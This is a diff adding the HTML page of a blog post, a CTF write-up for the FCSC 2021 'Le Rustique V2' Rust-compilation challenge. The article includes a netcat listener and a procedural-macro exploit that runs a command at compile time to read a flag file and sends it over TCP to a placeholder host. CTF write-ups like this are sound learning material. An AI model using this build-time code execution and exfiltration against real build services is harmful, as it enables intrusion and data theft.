@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en" data-mode="dark">
+  <head prefix="og: http://ogp.me/ns#">
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Hugo 0.83.1">
+<meta name="theme" content="Color Your World -- gitlab.com/rmaguiar/hugo-theme-color-your-world">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<title>FCSC - Le Rustique V2</title>
+
+
+
+
+
+
+<meta name="robots" content="index follow">
+<meta name="referrer" content="no-referrer-when-downgrade">
+
+
+
+
+  
+    <link rel="canonical" href="https://blogdraft.maxence.site/posts/fcsc-le-rustique-v2/">
+  
+
+
+
+
+
+
+
+
+<meta property="og:site_name" content="Max1Truc&#39;s blog">
+<meta property="og:title" content="FCSC - Le Rustique V2">
+
+  <meta property="og:url" content="https://blogdraft.maxence.site/posts/fcsc-le-rustique-v2/">
+
+
+
+
+
+
+
+
+  <meta property="og:type" content="article">
+  
+  
+    <meta property="article:published_time" content="2021-05-03">
+    <meta property="article:modified_time" content="2021-05-03">
+    <meta property="og:updated_time" content="2021-05-03">
+  
+
+  
+  
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="theme-color" content="#222">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "mainEntityOfPage": {
+        "@type": "WebSite",
+        "@id": "https:\/\/blogdraft.maxence.site\/"
+      },
+      "headline": "FCSC - Le Rustique V2",
+      "description": "",
+      
+      "url": "https:\/\/blogdraft.maxence.site\/posts\/fcsc-le-rustique-v2\/",
+      "inLanguage": "en",
+      "datePublished": "2021-05-03",
+      "dateModified": "2021-05-03",
+      "wordCount" : "487",
+      "publisher": {
+        "@type": "Person",
+        "name": ""
+      },
+      "author": {
+        "@type": "Person",
+        "name": "",
+        
+        
+      }
+    }
+  </script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.min.css">
+
+
+
+<noscript>
+
+  
+  
+
+  
+    <meta name="theme-color" content="#27a41c" media="(prefers-color-scheme: dark)">
+    <meta name="theme-color" content="#225670" media="(prefers-color-scheme: light)">
+  
+
+  <style>
+  
+    html {
+      --accent: #27a41c;
+    }
+  
+    .req-js {
+      display: none;
+    }
+    
+  </style>
+  
+</noscript>
+
+
+
+
+
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-700.woff" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-700.woff2" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-italic.woff" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-italic.woff2" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-regular.woff" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-regular.woff2" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/oswald-v29-latin-700.woff" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/oswald-v29-latin-700.woff2" as="font" crossorigin="anonymous">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script>
+    
+      'use strict';
+
+// Get default accent colors
+
+
+
+// Get CSS transition
+
+
+// =================================================
+// Mode switcher + Custom accent color
+// Based on: https://gist.github.com/regpaq/04c67e8aceecbf0fd819945835412d1f
+// =================================================
+
+
+  // New prefers-color-scheme media query to detect OS light/dark mode setting
+  const PREFERS_LIGHT = window.matchMedia('(prefers-color-scheme: light)');
+  const PREFERS_DARK = window.matchMedia('(prefers-color-scheme: dark)');
+
+
+const ROOT = document.documentElement;
+
+const SHEET = document.documentElement.style;
+const META_THEME_COLOR = document.querySelector('meta[name=theme-color]');
+
+// Set the dark
+function setDark() {
+  ROOT.dataset.mode = 'dark'
+};
+
+// Set the light
+function setLight() {
+  ROOT.dataset.mode = 'light'
+};
+
+// Initialization triggers light/dark mode based on prior preference, then OS setting
+// And yes, I know 'true' here is a string
+if(localStorage.getItem('isDark') == 'true') {
+  setDark()
+} else if(localStorage.getItem('isDark') == 'false') {
+  setLight()
+
+  
+    } else if(PREFERS_DARK.matches) {
+      setDark()
+    } else if(PREFERS_LIGHT.matches) {
+      setLight()
+  
+
+};
+
+
+
+
+// TODO
+// Maybe I should rethink this ...
+function getAccent() {
+  if (ROOT.dataset.mode === 'dark') {
+  
+    if (localStorage.getItem('darkAccent') === null) {
+      
+      
+      
+      var currentAccent = "#27a41c"
+    } else {
+    
+      var currentAccent = localStorage.getItem('darkAccent')
+      
+      
+      
+    }
+  } else if (ROOT.dataset.mode === 'light') {
+
+    if (localStorage.getItem('lightAccent') === null) {
+  
+      
+      
+
+      var currentAccent = "#225670"
+    } else {
+      var currentAccent = localStorage.getItem('lightAccent')
+      
+      
+      
+    }
+  };
+  
+  return currentAccent
+};
+
+var activeAccent = getAccent();
+
+// Set the active accent color for these right after setting mode color
+// Should mitigate any flickering
+SHEET.setProperty('--accent', activeAccent);
+
+// Also meta-theme cuz, why not
+META_THEME_COLOR.setAttribute('content', activeAccent);
+
+
+function updateAccent() {
+  var activeAccent = getAccent();
+
+  SHEET.setProperty('--accent', activeAccent);
+  PALETTE.value = activeAccent;
+  META_THEME_COLOR.setAttribute('content', activeAccent);
+};
+
+
+document.addEventListener('DOMContentLoaded', function () {
+
+  // Update the color picker with the active accent color 
+  PALETTE.value = activeAccent;
+
+  // Smooth transition, only when changing modes (and not loading pages)
+  function smoothTransition() {
+    document.body.style.transition 
+    = document.querySelector('header').style.transition
+    = document.querySelector('footer').style.transition
+    = 'background-color .3s ease, color .3s ease'
+  };
+  
+  // Give the user a choice
+  function userModeChange() {
+  
+    smoothTransition();
+
+    if (ROOT.dataset.mode == 'light') {
+      setDark();
+      localStorage.setItem('isDark', 'true')
+
+      
+      
+    } else {
+      setLight();
+      localStorage.setItem('isDark', 'false')
+      
+      
+      
+    };
+    
+    updateAccent()
+  };
+
+  
+  // TEST
+  // Keyboard shortcut for mode change, here for testing purposes only
+  // CTRL + ALT + M
+  
+
+
+  
+  
+    // Runs when OS changes light/dark mode. Changes only if you were on default
+    // color state (light on light mode, dark on dark mode).
+    function OSModeChange() {
+    
+      smoothTransition();
+      
+      if (PREFERS_LIGHT.matches) {
+        setLight();
+        localStorage.setItem('isDark', 'false')
+
+        
+        
+      } else if (PREFERS_DARK.matches) {
+        setDark();
+        localStorage.setItem('isDark', 'true')
+        
+        
+      };
+      
+      updateAccent()
+    };
+
+    // Listeners for when you change OS setting for light/dark mode
+    PREFERS_LIGHT.addListener(OSModeChange);
+    PREFERS_DARK.addListener(OSModeChange);
+  
+  
+  
+  // Mode change button
+  document.querySelector('footer button')
+    .addEventListener('click', userModeChange)
+})
+
+    
+  </script>
+
+
+
+  </head>
+
+  <body>
+
+    <header>
+      
+
+  <a href="/">Max1Truc&#39;s blog</a>
+
+
+
+
+
+    </header>
+
+    <div class="filler">
+      
+
+  <main>
+    <article>
+      <header>
+        
+        <h1>FCSC - Le Rustique V2</h1>
+
+        
+          <p>
+            
+              Published on <time datetime="2021-05-03">2021-05-03</time>
+            
+          </p>
+        
+        
+        
+        
+      </header>
+    
+      
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p>Hey, so I am a beginner in cyber security, but I participated to the <a href="https://france-cybersecurity-challenge.fr/">FCSC 2021</a>.</p>
+<p>I love Rust, and this CTF greeted me with a challenge in <code>misc</code> category around Rust, giving 500 points (the biggest score for a challenge :D).</p>
+<p>So, let&rsquo;s see how I pwned it!</p>
+<p>This challenge is actually a website, which, given a program, tries to compile it in a directory related to your session cookie and never executes it. We only know if the compilation succeeded and don&rsquo;t have access to the errors log. The most obvious solution would be to use the <code>include_*</code> macros to read the flag, maybe list directories, etc etc, and abuse the strict rust compiler to read the result. You may refer to previous write-ups (by others) about Le Rustique from the FCSC 2020. The problems are, these <code>include_*</code> macros are disabled and we don&rsquo;t know the path to the file.</p>
+<p>We thus have to figure out another way, and keep in mind the power of macros.</p>
+<p>Here are the most important informations (given in the website&rsquo;s FAQ):</p>
+<blockquote>
+<p>We are confident leaking the compilation command used.</p>
+<p>rustc &ndash;out-dir=/sessionDir/ -L /sessionDir/ -C opt-level=3 /sessionDir/randomFilename.rs</p>
+<p>Note that randomFilename is randomized by the server upon each compilation. sessionDir is a randomly generated folder name based on your session cookie. All the files are cleaned every hour.</p>
+</blockquote>
+<p>First thing to note, the build results are in the same directory which is added to the librairies path.
+Can we build a library and include it in another file ?</p>
+<p>We need to give a specific or at least predictable name to our build result, and ask the compiler to build it as a library.
+That seems impossible since we can&rsquo;t control rustc&rsquo;s parameters, wait&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#75715e">#![crate_type = </span><span style="color:#e6db74">&#34;lib&#34;</span><span style="color:#75715e">]</span>
+<span style="color:#75715e">#![crate_name = </span><span style="color:#e6db74">&#34;mymacro&#34;</span><span style="color:#75715e">]</span>
+</code></pre></div><p>Well, problem fixed.
+Now we have to figure out how to execute code during build.
+The only solution I could think of was using macros, but I didn&rsquo;t know how to read files using them, and without <code>include_*</code> macros.
+Thanksfully, Rust has a great documentation: <a href="https://doc.rust-lang.org/reference/procedural-macros.html">https://doc.rust-lang.org/reference/procedural-macros.html</a> .
+We can code macros (called procedural macros) in plain Rust, using the standard library, and then execute them from a second file.</p>
+<p>To exfiltrate macros' results, the fastest method was to send a TCP packet to a VPS listening with Netcat.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">while</span> :
+<span style="color:#66d9ef">do</span>
+nc -l -p <span style="color:#ae81ff">4242</span>
+echo --- WAITING FOR NEXT COMMAND RESULT ---
+<span style="color:#66d9ef">done</span>
+</code></pre></div><p>You may however note that you could also make a HTTP GET request to services like <a href="https://requestcatcher.com/">https://requestcatcher.com/</a> or use the &lsquo;force-failed build&rsquo; method from write-ups for Le Rustique v1.</p>
+<p>Final code :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#75715e">// stage1.rs
+</span><span style="color:#75715e"></span><span style="color:#75715e">#![crate_type = </span><span style="color:#e6db74">&#34;proc-macro&#34;</span><span style="color:#75715e">]</span>
+<span style="color:#75715e">#![crate_name = </span><span style="color:#e6db74">&#34;mymacro&#34;</span><span style="color:#75715e">]</span>
+
+<span style="color:#66d9ef">use</span> std::process::Command;
+<span style="color:#66d9ef">use</span> std::net::TcpStream;
+<span style="color:#66d9ef">use</span> std::io::prelude::<span style="color:#f92672">*</span>;
+
+<span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">crate</span> proc_macro;
+<span style="color:#66d9ef">use</span> proc_macro::TokenStream;
+
+<span style="color:#75715e">#[proc_macro_attribute]</span>
+<span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">hello</span>(_attr: <span style="color:#a6e22e">TokenStream</span>, item: <span style="color:#a6e22e">TokenStream</span>) -&gt; <span style="color:#a6e22e">TokenStream</span> {
+    <span style="color:#66d9ef">let</span> ls_out <span style="color:#f92672">=</span> Command::new(<span style="color:#e6db74">&#34;cat&#34;</span>).arg(<span style="color:#e6db74">&#34;/folder_with_a_special_reward/flag_TheFlagIsInThere.txt&#34;</span>).output().expect(<span style="color:#e6db74">&#34;failed to execute process&#34;</span>);
+
+    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> stream <span style="color:#f92672">=</span> TcpStream::connect(<span style="color:#e6db74">&#34;ADDRESSEIP:4242&#34;</span>).unwrap();
+    stream.write(<span style="color:#f92672">&amp;</span>ls_out.stdout).unwrap();
+
+    item
+}
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#75715e">// stage2.rs
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">crate</span> mymacro;
+
+<span style="color:#66d9ef">use</span> mymacro::hello;
+
+<span style="color:#75715e">#[hello]</span>
+<span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">main</span>() {}
+</code></pre></div>
+
+
+    </article>
+  </main>
+
+
+    </div>
+    
+    <footer>
+      
+
+  Copyright © 2021 Max1Truc
+<br />
+Licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode">CC BY-NC-SA</a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="req-js">
+  <button class="outline-dashed" title="Change to light/dark mode."><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><use xlink:href="#adjust"/></svg></button><input class="outline-dashed" type="color" list="presets" value="#27a41c" title="Change accent color." aria-label="Change accent color."><datalist id="presets"><option value="#225670"><option value="#27a41c"><option value="#1f676b"><option value="#f3a530"><option value="#902b37"><option value="#1dbc91"><option value="#754e85"><option value="#7fc121"><option value="#a8314a"><option value="#ff7433"><option value="#3e6728"><option value="#c063bd"></datalist>
+</section>
+
+
+
+
+
+    </footer>
+    
+    <svg xmlns="http://www.w3.org/2000/svg" width="0" height="0" aria-hidden="true">
+      <symbol viewBox="0 0 512 512" id="adjust">
+        <path d="M8 256c0 136.966 111.033 248 248 248s248-111.034 248-248S392.966 8 256 8 8 119.033 8 256zm248 184V72c101.705 0 184 82.311 184 184 0 101.705-82.311 184-184 184z"/>
+      </symbol>
+      
+      
+      
+      
+  
+<symbol viewBox="0 0 448 512" id="hashtag">
+  <path d="M440.667 182.109l7.143-40c1.313-7.355-4.342-14.109-11.813-14.109h-74.81l14.623-81.891C377.123 38.754 371.468 32 363.997 32h-40.632a12 12 0 0 0-11.813 9.891L296.175 128H197.54l14.623-81.891C213.477 38.754 207.822 32 200.35 32h-40.632a12 12 0 0 0-11.813 9.891L132.528 128H53.432a12 12 0 0 0-11.813 9.891l-7.143 40C33.163 185.246 38.818 192 46.289 192h74.81L98.242 320H19.146a12 12 0 0 0-11.813 9.891l-7.143 40C-1.123 377.246 4.532 384 12.003 384h74.81L72.19 465.891C70.877 473.246 76.532 480 84.003 480h40.632a12 12 0 0 0 11.813-9.891L151.826 384h98.634l-14.623 81.891C234.523 473.246 240.178 480 247.65 480h40.632a12 12 0 0 0 11.813-9.891L315.472 384h79.096a12 12 0 0 0 11.813-9.891l7.143-40c1.313-7.355-4.342-14.109-11.813-14.109h-74.81l22.857-128h79.096a12 12 0 0 0 11.813-9.891zM261.889 320h-98.634l22.857-128h98.634l-22.857 128z"/>
+</symbol>
+
+
+
+      
+      
+      
+    </svg>
+
+    
+    
+    
+
+      <script>
+        
+          'use strict';const PALETTE=document.querySelector('footer input');PALETTE.onchange=function(){const a=PALETTE.value;SHEET.setProperty('--accent',a),ROOT.dataset.mode==='light'?localStorage.setItem('lightAccent',a):localStorage.setItem('darkAccent',a),updateAccent()}
+        
+      </script>
+
+    
+    
+    
+    
+
+  </body>
+</html>
